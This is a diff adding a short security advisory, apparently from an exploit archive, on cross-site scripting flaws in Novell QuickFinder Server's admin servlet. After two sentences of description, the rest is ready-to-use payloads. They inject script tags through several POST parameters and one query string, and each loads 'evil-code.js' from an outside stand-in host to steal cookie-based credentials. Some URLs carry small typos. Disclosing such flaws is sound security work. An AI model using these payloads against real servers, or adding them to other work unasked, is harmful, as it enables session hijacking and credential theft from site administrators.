@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/33708/info
+
+Novell QuickFinder Server is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+"add virtual server"
+
+https://server:2200/qfsearch/AdminServlet?&req=displayaddsite
+
+Post:
+siteloc=%22%3E%3Cscript%20src=http://www.example2.com/scripts/evil-code.js%3E%3C/script%3E
+
+"Default"
+
+Post:
+https://server:2200/qfsearch/AdminServlet?site=globalsearchsite&req=generalproperties
+site="><script 
+src=http://www.www.example2.com/scripts/evil-code.js></script>
+
+"services, synchronization"
+
+Post:
+https://server:2200/qfsearch/AdminServlet?&req=clusterserviceproperties
+site="><script 
+src=http://www.www.example2.com/scripts/evil-code.js></script>
+
+
+Querystring:
+
+https://server2200/qfsearch/AdminServlet?&req=global&adminurl="><script 
+src=http://www.www.example2.com/scripts/evil-code.js></script>
+
